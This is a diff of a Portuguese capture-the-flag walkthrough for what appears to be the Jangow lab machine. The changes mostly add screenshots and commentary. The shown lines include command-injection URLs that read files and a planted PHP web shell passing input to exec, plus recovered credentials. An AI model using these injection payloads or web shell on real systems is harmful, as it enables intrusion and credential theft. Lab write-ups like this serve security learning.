@@ -180,14 +180,14 @@ MAC Address: 52:54:00:36:85:5E (QEMU virtual NIC)
 ![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/url_expl.png)
 
 Flag User:
-![alt text](path/to/file)
+![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/flag_user.png)
+
 
 http://jangow/site/busque.php?buscar=cat%20/home/jangow01/user.txt
-d41d8cd98f00b204e9800998ecf8427e
 
 
-Encontrado um arquivo “config.php” com possíveis credenciais:
-
+Listando o conteúdo do diretório, foi encontrado um arquivo “config.php” com possíveis credenciais:
+![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/list_dir.png)
 
 
 
@@ -218,15 +218,16 @@ http://jangow/site/busque.php?buscar=echo '<?php exec("ping -c 4 " . $_GET['host
 
 
 
-
+Executar no browser:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 http://jangow/site/shell.php?host=localhost;cat wordpress/config.php 2\>\&1 /dev/null           
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_shell.png)
 
+Encontramos a seguinte credencial:
 
-
-login desafio02
-pass  abygurl69
+login desafio02 <br>
+pass  abygurl69 <br>
 
 
 
